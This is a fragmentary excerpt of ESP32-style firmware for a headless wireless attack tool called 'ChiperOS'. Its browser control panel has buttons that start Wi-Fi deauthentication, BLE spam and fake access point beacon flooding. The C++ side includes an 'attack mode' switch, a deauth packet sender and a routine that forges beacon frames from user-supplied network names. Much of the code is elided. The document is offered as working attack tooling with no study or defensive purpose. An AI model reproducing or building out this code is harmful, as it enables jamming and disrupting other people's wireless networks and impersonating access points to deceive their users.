...
void handleStop();void handleBLEStart();
...
<h1>🛡️ ChiperOS (Headless)</h1>
<div class="warning">⚠️ No Screen. Use Serial Monitor for debug.</div>
...
function togD(){dA=!dA;let b=document.getElementById('dB'),s=document.getElementById('dSt');
  if(dA){if(confirm('Start Deauth? Site will disconnect! Reboot to stop.')){
  ...
  else{fetch('/api/stop').then(()=>{b.innerText='▶ Start';b.className='btn btn-d';s.className='st st-off';s.innerText='OFF';log('Stopped');});}}
function togB(){bA=!bA;let b=document.getElementById('bB'),s=document.getElementById('bSt');
  if(bA){if(confirm('Start BLE? Site will disconnect! Reboot to stop.')){
    fetch('/api/ble/start').then(()=>{b.innerText='⏹ Stop';s.className='st st-on';s.innerText='ON';log('BLE STARTED');});
  } else { bA=false; } }
  else{fetch('/api/stop').then(()=>{b.innerText='▶ Start';s.className='st st-off';s.innerText='OFF';log('Stopped');});}}function togF(){fA=!fA;let b=document.getElementById('fB'),s=document.getElementById('fSt');
  if(fA){if(confirm('Start FakeAP? Site will disconnect! Reboot to stop.')){
...
void setup() {
  ...
  server.on("/api/fakeap/start", HTTP_GET, handleFakeAPStart);  server.on("/api/fakeap/stop", HTTP_GET, handleStop);
...
void switchToAttackMode() {
  if (!isAttackMode) {
    ...
    isAttackMode = true;
    Serial.println("⚔️ ATTACK MODE ACTIVE (Site Offline)");
  }
}
...
void loop() {
  if (!isAttackMode) {
    server.handleClient();
  } else {    if (deauthRunning) sendDeauthPacket();
...
void sendDeauthPacket() {
  static int chIdx = 0;
  static unsigned long lastChSwitch = 0;
...
void sendFakeAP() {
  ...
  beacon[10] = 0x02; beacon[11] = 0x00; beacon[12] = 0x00; beacon[13] = 0x00; beacon[14] = 0x00; beacon[15] = idx;  memcpy(&beacon[16], &beacon[10], 6);
...
void handleFakeAPConfig() {
  String names = server.arg("n");  int idx = 0, start = 0;
